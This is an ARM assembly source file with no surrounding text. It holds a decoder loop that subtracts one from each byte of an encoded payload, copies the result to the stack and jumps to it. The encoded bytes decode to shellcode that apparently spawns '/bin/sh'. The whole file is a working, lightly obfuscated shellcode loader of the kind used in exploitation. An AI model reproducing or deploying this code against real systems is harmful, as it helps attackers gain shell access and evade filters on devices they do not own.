.global _start
 
_start:
 
  mov r6, #48        @ size of the shellcode
 
  mov r1, pc         @ move into r1 the pc
 
  add r1, #44        @ address of the shellcode
 
  sub r4, r4, r4     @ index for the loop
 
  sub sp, #48        @ save space for the decoded shellcode
 
  mov r3, sp         @ save address of the decoded shellcode into r3
 
start:
 
  ldrb r2, [r1, r4]  @ store into r2 the byte at the location (r1 + r4)
 
  sub r2, #1         @ decoding operation
 
  strb r2, [r3, r4]  @ save the decoded byte into the allocated memory
 
  add r4, #1         @ increment the index by 1
 
  subs r5, r6, r4    @ check the index with the size of the shellcode
 
  bgt start          @ jump to start if r6>r4
 
end:
 
  add sp, #56        @ add 56 to the sp
 
  blx r3             @ jmp to the allocated area
 
  shellcode: .byte 0x10,0x1,0xa1,0xe2,0x21,0x1,0x81,0xe3,0x3,0x21,0x43,0xe1,0x6,0x1,0x2e,0xea,0xe,0x11,0xa1,0xe2,0xc,0x71,0xa1,0xe4,0x1,0x1,0x1,0xf0,0x1,0x1,0xa1,0xe4,0x2,0x71,0xa1,0xe4,0x1,0x1,0x1,0xf0,0x30,0x63,0x6a,0x6f,0x30,0x74,0x69,0x1

